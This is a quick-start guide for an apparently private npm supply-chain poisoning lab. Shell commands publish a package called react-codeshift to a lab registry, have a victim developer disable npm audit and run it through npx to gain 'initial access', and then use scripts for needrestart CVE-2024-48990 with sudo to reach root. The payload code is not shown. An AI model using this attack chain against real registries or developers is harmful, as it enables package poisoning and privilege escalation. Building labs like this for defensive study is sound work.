# Lab quick start

## Attacker

```bash
git clone <repository-url> npm_poisoning_poc
cd npm_poisoning_poc
cp .env.example .env
# Set the environment-specific registry host, URL, allowed host and developer account in .env.
set -a
source .env
set +a
./setup/registry-native.sh up
npm adduser --registry "$LAB_REGISTRY_URL" --auth-type=legacy
npm whoami --registry "$LAB_REGISTRY_URL"
export ALLOW_LAB_PUBLISH=I_UNDERSTAND_THIS_IS_A_PRIVATE_LAB
./tools/publish-react-codeshift.sh
npm view react-codeshift --registry "$LAB_REGISTRY_URL" \
  name version dist.tarball
```

## Developer

```bash
git clone <repository-url> npm_poisoning_poc
cd npm_poisoning_poc
cp .env.example .env
# Set the environment-specific values in .env, then load them.
set -a
source .env
set +a
npm config set registry "$LAB_REGISTRY_URL" --location=user
npm config set audit false --location=user
cd ~/npm_poisoning_poc/victim-app/frontend
LAB_RUN_ID=LAB-001 npx --yes react-codeshift@1.1.0 \
  --transform=react-codeshift/transforms/rename-unsafe-lifecycles.js \
  ./src
cat ~/.local/state/package-lab/initial-access.json
```

Expected integrated status:

```json
"privilege_fixture": {
  "attempted": true,
  "status": "armed"
}
```

## White trigger

```bash
cd ~/npm_poisoning_poc/tools/needrestart-cve-2024-48990
sudo ./white-apt-trigger.sh cron
sudo ./verify-root-marker.sh
```

## Cleanup

```bash
cd ~/npm_poisoning_poc/tools/needrestart-cve-2024-48990
sudo LAB_DEVELOPER="$LAB_DEVELOPER" ./cleanup.sh
```

The repository is temporarily public only to bootstrap isolated lab machines without GitHub credentials. Make it private as soon as every required machine has a clone. Do not place environment-specific addresses, usernames, credentials, tokens, registry `htpasswd`, generated evidence, or offline package archives in the repository.
